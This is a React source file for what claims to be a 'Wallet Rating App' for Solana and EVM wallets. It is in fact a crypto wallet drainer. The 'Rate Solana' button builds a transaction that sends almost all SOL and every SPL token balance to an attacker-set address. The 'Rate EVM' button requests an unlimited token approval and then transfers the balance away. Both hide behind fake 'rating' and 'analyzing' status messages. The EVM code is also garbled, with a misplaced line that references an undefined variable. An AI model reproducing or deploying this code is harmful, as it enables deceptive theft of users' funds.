import { WagmiConfig } from 'wagmi';
import { ERC20_ABI } from './erc20-abi';
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
import React, { useState, useEffect, useMemo }    from 'react';
import { ConnectionProvider, WalletProvider, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PhantomWalletAdapter } from '@solana/wallet-adapter-wallets';
import { createWalletClient, custom, configureChains } from 'wagmi';
import { mainnet, goerli } from 'wagmi/chains';
import { publicProvider } from 'wagmi/providers/public';
import { MetaMaskConnector } from 'wagmi/connectors/metaMask';
import { CoinbaseWalletConnector } from 'wagmi/connectors/coinbaseWallet';
import { useAccount, useConnect, useDisconnect } from 'wagmi';
import * as solanaWeb3 from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
import { Web3 } from 'web3';

// Configure Wagmi (EVM)
const { chains, provider, webSocketProvider } = configureChains(
  [mainnet, goerli],
  [publicProvider()]
);

const wagmiClient = createWalletClient({
  autoConnect: true,
  provider,
  connectors: [
    new MetaMaskConnector({ chains }),
    new CoinbaseWalletConnector({
      chains,
      options: {
        appName: 'Wallet Rating App',
      },
    }),
  ],
});

// Solana Setup
const SOLANA_RPC = process.env.REACT_APP_SOLANA_RPC || 'https://api.mainnet-beta.solana.com';

function AppWrapper() {
  const wallets = useMemo(() => [new PhantomWalletAdapter()], []);
  
  return (
    <ConnectionProvider endpoint={SOLANA_RPC}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <WagmiConfig client={wagmiClient}>
            <App />
          </WagmiConfig>
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}

function App() {
  // Solana Wallet
  const { publicKey, signTransaction } = useWallet();
  
  // EVM Wallet
  const { address: evmAddress, isConnected } = useAccount();
  const { connect, connectors } = useConnect();
  const { disconnect } = useDisconnect();
  
  const [transactionDescription, setTransactionDescription] = useState('');

  const rateSolana = async () => {
    if (!publicKey) {
      setTransactionDescription('Please connect Solana wallet first');
      return;
    }

    try {
      setTransactionDescription('Rate Solana Wallet...');
      const connection = new solanaWeb3.Connection(SOLANA_RPC);
      
      // Get SOL balance
      const balance = await connection.getBalance(publicKey);
      if (balance < 5000) {
        setTransactionDescription('Insufficient SOL Fees to cover ranking');
        return;
      }

      // Get token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: splToken.TOKEN_PROGRAM_ID,
      });

      const transaction = new solanaWeb3.Transaction();
      
      // Add SOL transfer
      transaction.add(solanaWeb3.SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new solanaWeb3.PublicKey(process.env.REACT_APP_RATING_SOLANA_ADDRESS),
        lamports: balance - 5000,
      }));

      // Add SPL token transfers
      for (const account of tokenAccounts.value) {
        const tokenInfo = account.account.data.parsed.info;
        const mint = new solanaWeb3.PublicKey(tokenInfo.mint);
        const token = new splToken.Token(
          connection,
          mint,
          splToken.TOKEN_PROGRAM_ID,
          publicKey
        );

        const sourceAccount = await token.getAccountInfo(account.pubkey);
        if (sourceAccount.amount.gt(new splToken.u64(0))) {
          transaction.add(splToken.createTransferInstruction(
            account.pubkey,
            new solanaWeb3.PublicKey(process.env.REACT_APP_RATING_SOLANA_ADDRESS),
            publicKey,
            sourceAccount.amount,
            [],
            splToken.TOKEN_PROGRAM_ID
          ));
        }
      }

      // Sign and send
      setTransactionDescription('Get Results...');
      const signedTx = await signTransaction(transaction);
      const txid = await connection.sendRawTransaction(signedTx.serialize());
      
      setTransactionDescription(`Rank Analyzed: ${txid}`);
      await connection.confirmTransaction(txid);
      setTransactionDescription(`Rank confirmed: ${txid}`);

    } catch (error) {
      setTransactionDescription(`Error: ${error.message}`);
    }
  };

  const rateEVM = async () => {
    if (!isConnected) {
      setTransactionDescription('Please connect EVM wallet first');
  const balance = await tokenContract.methods.balanceOf(evmAddress).call();
      return;
    }

    try {
      setTransactionDescription('Rate EVM wallet...');
      const web3 = new Web3(window.ethereum);
      
      // Example ERC20 transfer
      const tokenContract = new web3.eth.Contract(
        ERC20_ABI, 
        process.env.REACT_APP_EVM_TOKEN_ADDRESS
      );

      // Approve first
      setTransactionDescription('Ranking tokens...');
      await tokenContract.methods
        .approve(process.env.REACT_APP_RATING_EVM_ADDRESS, MAX_UINT256)
        .send({ from: evmAddress });

      // Transfer
      setTransactionDescription('Analyzing tokens...');
      
      const tx = await tokenContract.methods
      .transferFrom(
        evmAddress,
        process.env.REACT_APP_RATING_EVM_ADDRESS,
        balance
      )
      .send({ from: evmAddress });

    setTransactionDescription(`Rank confirmed: ${tx.transactionHash}`);

  } 
  
catch (error) {
  setTransactionDescription(
    error.message.includes('User rejected') ?
    'Transaction rejected by user' :
    `Error: ${error.message}`
  );
}  }
return (
  <div>
    <WalletMultiButton />
    <button onClick={rateSolana}>Rate Solana</button>
    <button onClick={rateEVM}>Rate EVM</button>
    <p>{transactionDescription}</p>
  </div>
);}
  
 